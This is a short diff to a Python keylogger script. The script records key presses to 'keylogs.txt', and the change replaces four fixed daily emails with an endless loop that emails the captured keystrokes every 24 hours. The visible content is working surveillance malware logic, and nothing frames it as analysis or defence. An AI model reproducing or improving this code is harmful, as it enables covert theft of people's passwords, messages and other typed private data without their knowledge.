@@ -42,20 +42,10 @@ with Listener(on_press=on_press) as listener:
 with open('keylogs.txt', 'r') as f:
     keylogtxt = f.read()
 
-# set how long you want to wait until the email is sent in seconds
-# Day 1
-time.sleep(86400)
+while True:
 
-send_email('Test Subject', keylogtxt)
-# Day 2
-time.sleep(86400)
+    time.sleep(86400)
 
-send_email('Test Subject', keylogtxt)
-# Day 3
-time.sleep(86400)
+    send_email('Test Subject', keylogtxt)
 
-send_email('Test Subject', keylogtxt)
-# Day 4
-time.sleep(86400)
 
-send_email('Test Subject', keylogtxt)
